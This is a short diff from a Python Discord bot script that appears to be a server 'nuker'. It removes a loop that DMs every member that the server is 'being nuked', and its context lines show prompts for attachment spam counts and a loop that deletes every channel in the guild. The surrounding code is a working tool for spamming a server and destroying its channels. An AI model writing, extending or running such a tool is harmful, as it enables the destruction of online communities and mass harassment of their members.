@@ -166,14 +166,6 @@ while True:
             attach_spam = input(Fore.CYAN + "Do you want to spam attachments? (y/n): ").lower()
             repeat = int(input(Fore.CYAN + "How many times to spam?: "))
 
-            # DM all members with server name
-            for member in guild.members:
-                try:
-                    await member.send(f"🔥 This server is being nuked! Server Name: {guild.name}")
-                    print(Fore.BLUE + f"Sent DM to {member.name}")
-                except Exception as e:
-                    logging.error(f"Failed to DM {member.name}: {e}")
-
             # Delete channels
             for channel in guild.channels:
                 try:
